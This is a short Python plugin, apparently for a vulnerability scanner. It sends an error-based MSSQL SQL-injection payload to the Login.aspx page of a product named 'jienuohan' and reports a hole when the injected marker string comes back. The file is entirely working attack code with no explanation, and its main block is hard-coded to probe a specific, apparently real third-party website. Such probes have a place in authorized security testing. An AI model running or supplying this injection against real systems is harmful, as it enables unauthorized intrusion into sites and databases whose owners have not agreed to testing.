#!/usr/bin/env python
# -*- coding: utf-8 -*-
import time
def assign(service, arg):
    if service == "jienuohan":
        return True, arg

def audit(arg):
    url = arg + 'Login.aspx'
    data = "username=' %2B (select convert(int,'test'%2B'vul') FROM syscolumns) %2B '"
    code,head,res,_,_ = curl.curl2(url,data)
    if code==200 and 'testvul' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('jienuohan', 'http://tg.fiberglass365.com/')[1])